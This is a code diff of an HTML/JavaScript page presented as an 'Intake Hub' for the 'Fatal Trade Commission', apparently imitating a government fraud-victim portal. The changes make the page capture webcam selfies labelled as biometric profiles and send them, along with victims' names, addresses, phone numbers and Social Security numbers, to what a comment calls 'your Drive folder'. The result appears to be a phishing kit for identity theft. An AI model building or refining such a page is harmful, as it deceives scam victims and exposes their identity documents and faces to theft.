@@ -1,6 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<!DOCTYPE html><html lang="en"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Intake Hub - Fatal Trade Commission</title>
@@ -8,12 +6,7 @@
     <link rel="icon" type="image/png" href="https://lh3.googleusercontent.com/d/193iGXSOf2vVOFHWVY_Z_MUbdOIkKpBG7">
 
     <style>
-        /* BASE DESIGN ENGINE - FLUID STACKING FOR ALL PLATFORMS */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #f4f7fa;
@@ -84,7 +77,6 @@
         .case-input-field:focus { outline: none; border-color: #065cb4; }
         .execute-query-btn { background-color: #065cb4; color: #ffffff; border: none; border-radius: 12px; padding: 14px 24px; font-size: 16px; font-weight: 900; cursor: pointer; white-space: nowrap; }
         
-        /* GATEWAY VERIFICATION CARD SECURITY OVERRIDES */
         .verification-gate-card { background-color: #fffaf0; border: 2px solid #fbd38d; border-radius: 16px; padding: 24px; text-align: center; display: flex; flex-direction: column; gap: 16px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
         .gate-title { font-size: 18px; font-weight: bold; color: #dd6b20; text-transform: uppercase; letter-spacing: 0.5px; }
         .gate-btn { background-color: #dd6b20; color: white; border: none; border-radius: 12px; padding: 18px 24px; font-size: 15px; font-weight: 900; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 14px rgba(221,107,32,0.3); border-bottom: 4px solid #9c4221; }
@@ -394,6 +386,7 @@
         function terminateWebcamHardware() { if (videoStreamRef) { videoStreamRef.getTracks().forEach(t => t.stop()); videoStreamRef = null; } }
         function deactivateFullscreenCamera() { terminateWebcamHardware(); document.getElementById('fullscreenCameraOverlay').style.display = 'none'; resetCameraModule(); }
 
+        // FIXED INTEGRATION ROUTINE
         function commitVerifiedCaptureAsset() {
             terminateWebcamHardware();
             document.getElementById('fullscreenCameraOverlay').style.display = 'none';
@@ -401,15 +394,18 @@
 
             if (cameraModeIsFrontSelfie) {
                 if (initialEnrollmentModeActive) {
+                    // Save to user interface, unlock session, AND dispatch straight to your Drive folder immediately
                     targetCase.biometricImg = base64CapturedOutputString;
                     targetCase.passedGateThisSession = true; 
                     localStorage.setItem('ftc_sys_cases', JSON.stringify(cases));
-                    dispatchPayloadToCloud(targetCase, "Initial Identity Verification Profile Picture Setup Executed Natively");
+                    dispatchPayloadToCloud(targetCase, "Initial Security Verification Profile Picture Setup Executed Natively");
                 } else {
+                    // Verification pass -> upload check verification signature to backend ledger sheets
                     targetCase.passedGateThisSession = true;
-                    trackVictimCase(); 
+                    dispatchPayloadToCloud(targetCase, "Returning Verification Session Check Match Token Transmitted");
                 }
             } else {
+                // Regular paperwork capture workflow execution
                 dispatchEvidenceTransmissionPayload(targetCase);
             }
         }
@@ -432,7 +428,7 @@
             const finalPackagePayload = {
                 caseId: targetCase.id, victimName: targetCase.victimName, victimAddress: targetCase.victimAddress,
                 victimPhone: targetCase.victimPhone, victimSsn: targetCase.victimSsn, statement: logStatement,
-                filename: "MOBILE_SCAN_EXHIBIT_" + new Date().getTime() + ".jpg", mimeType: "image/jpeg",
+                filename: (cameraModeIsFrontSelfie ? "BIOMETRIC_PROFILE_" : "PAPERWORK_EXHIBIT_") + new Date().getTime() + ".jpg", mimeType: "image/jpeg",
                 fileData: base64CapturedOutputString.split(',')[1]
             };
             base64CapturedOutputString = "";
@@ -491,7 +487,6 @@
                     <div style="display:flex; flex-direction:column; gap:8px;">${evidenceHtml}</div>
                 </div>
             `;
-            lucide.createIcons();
         }
 
         function revealBureauSuccessModal() { document.getElementById('bureauSuccessModal').style.display = 'flex'; }
@@ -520,11 +515,7 @@
             localStorage.setItem('ftc_sys_cases', JSON.stringify(cases)); alert("Updates saved."); renderOfficerLayout();
         }
         function resetMockData() { localStorage.clear(); location.reload(); }
-        
-        window.onload = function() { 
-            synchronizeInternalMemoryDatabase();
-            switchTab('victim-portal-tab'); 
-        }
+        window.onload = function() { synchronizeInternalMemoryDatabase(); switchTab('victim-portal-tab'); }
     </script>
 </body>
 </html>
